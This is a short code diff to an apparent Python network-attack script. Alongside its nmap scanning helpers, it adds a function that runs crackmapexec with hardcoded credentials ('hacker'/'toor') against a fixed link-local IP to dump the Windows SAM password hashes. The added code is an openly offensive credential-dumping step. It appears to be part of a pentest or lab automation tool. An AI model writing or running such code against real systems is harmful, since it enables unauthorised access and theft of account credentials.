@@ -1,6 +1,7 @@
 import nmap
 import re
 import sys
+import subprocess
 
 def convertIpToRange(ip):
 	rgx = re.compile(r'\b\d{1,3}\.\d{1,3}\.\d{1,3}\.')
@@ -29,9 +30,15 @@ def nmScan(ip):
                 targets.append(host_obj)
     return targets
 
+def firstMachine(username, password, ip):
+    proc = subprocess.Popen('crackmapexec -u {} -p {} -d WORKGROUP {} --sam'.format(username, password, ip), stdout=subprocess.PIPE)
+    tmp = proc.stdout.read()
+    print(tmp)
+
 def main():
-	ip = sys.argv[1]
-	print(convertIpToRange(ip))
+    ip = sys.argv[1]
+    print(convertIpToRange(ip))
+    firstMachine('hacker', 'toor', '169.254.121.23')
 	#target_hosts = nmScan(ip)
 
 if __name__ == "__main__":
